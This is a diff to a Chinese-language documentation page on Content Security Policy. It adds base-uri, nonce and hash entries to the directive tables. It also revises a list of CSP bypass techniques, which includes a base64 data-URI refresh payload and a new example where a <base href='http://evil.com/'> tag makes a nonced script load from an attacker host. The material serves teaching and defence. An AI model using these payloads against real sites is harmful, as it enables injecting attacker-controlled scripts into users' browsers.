@@ -48,6 +48,7 @@ media-src       定义 <audio>、<video> 等引用资源加载策略
 object-src      定义 <applet>、<embed>、<object> 等引用资源加载策略
 script-src      定义 JS 加载策略
 style-src       定义 CSS 加载策略
+base-uri        定义 <base> 根URL策略，不使用default-src作为默认值
 sandbox         值为 allow-forms，对资源启用 sandbox
 report-uri      值为 /report-uri，提交日志
 ============    ============
@@ -77,6 +78,10 @@ report-uri      值为 /report-uri，提交日志
 | 'unsafe-inline'    | script-src 'unsafe-inline' | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
 +--------------------+----------------------------+------------------------------------------------------------------+
 | 'unsafe-eval'      | script-src 'unsafe-eval'   | 允许一些不安全的代码执行方式，例如js的eval()                     |
++--------------------+----------------------------+------------------------------------------------------------------+
+| 'nonce-<base64-value>'| script-src 'nonce-bm9uY2U='  | 使用随机的nonce，允许加载标签上nonce属性匹配的标签   |
++--------------------+----------------------------+------------------------------------------------------------------+
+| '<hash-algo>-<base64-value>' | script-src 'sha256-<base64-value>'   | 允许hash值匹配的代码块被执行                     |
 +--------------------+----------------------------+------------------------------------------------------------------+
 
 - ``none``：你可能期望不匹配任何内容
@@ -157,4 +162,8 @@ iframe
 - For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
 - ``<link rel="import" />``
 - ``<meta http-equiv="refresh" content="0; url=http://...." />``
-- 策略配置为 ``self`` 时，可通过 ``base`` 标签修改源来bypass
+- 当script-src为nonce或无限制，且base-uri无限制时，可通过 ``base`` 标签修改根URL来bypass，如下加载了http://evil.com/main.js
+    ::
+
+        <base href="http://evil.com/">
+        <script nonce="correct value" src="/main.js"></script>
